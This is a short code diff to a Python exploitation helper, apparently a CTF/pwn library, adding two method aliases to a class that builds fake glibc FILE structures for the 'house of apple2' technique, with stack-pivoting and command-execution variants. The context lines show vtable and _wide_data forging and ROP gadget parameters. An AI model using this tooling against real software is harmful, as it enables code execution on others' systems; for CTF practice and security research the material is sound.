@@ -230,6 +230,8 @@ class IO_FILE_plus_struct(FileStructure):
         self._wide_data = standard_FILE_addr - 0x48
         self.vtable = _IO_wfile_jumps_addr
         return self.__bytes__()
+    
+    house_of_apple2_execmd_when_do_IO_operation = house_of_apple2_execmd_when_exit
 
     # house of apple2: https://www.roderickchan.cn/post/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/
     def house_of_apple2_stack_pivoting_when_exit(self, standard_FILE_addr: int, _IO_wfile_jumps_addr: int, leave_ret_addr: int, pop_rbp_addr: int, fake_rbp_addr: int):
@@ -248,6 +250,8 @@ class IO_FILE_plus_struct(FileStructure):
         self._wide_data = standard_FILE_addr - 0x48
         self.vtable = _IO_wfile_jumps_addr
         return self.__bytes__()
+
+    house_of_apple2_stack_pivoting_when_do_IO_operation = house_of_apple2_stack_pivoting_when_exit
 
 
 def payload_replace(payload: str or bytes, rpdict:dict=None, filler="\x00"):
